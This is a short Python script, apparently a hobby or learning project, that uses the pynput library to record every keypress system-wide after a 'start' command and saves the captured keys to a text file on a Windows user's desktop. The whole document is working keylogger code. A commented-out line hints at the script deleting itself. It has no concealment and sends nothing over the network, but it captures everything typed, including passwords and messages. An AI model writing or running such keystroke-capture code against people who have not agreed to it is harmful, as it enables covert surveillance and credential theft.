from pynput.keyboard import Key, Listener


output = []


def on_press(key):
    if key == Key.enter:
        output.append("\n")
    elif key == Key.space:
        output.append(" ")
    else:
        output.append(str(key))


def key_thread():
    listener = Listener(on_press=on_press)
    listener.start()


def main():
    log_dir = "C:/users/samsm/desktop/"

    # remove(argv[0])
    com = input("Command: ")
    started = False
    while com != "end":
        if com == "start" and not started:
            key_thread()
            started = True
        print(output)
        com = input("Command: ")

    fi = open(log_dir + "out.txt", "w")
    for i in output:
        b = i.replace("\'", '')
        print(b)
        fi.write(b)
    fi.close()


if __name__ == "__main__":
    main()



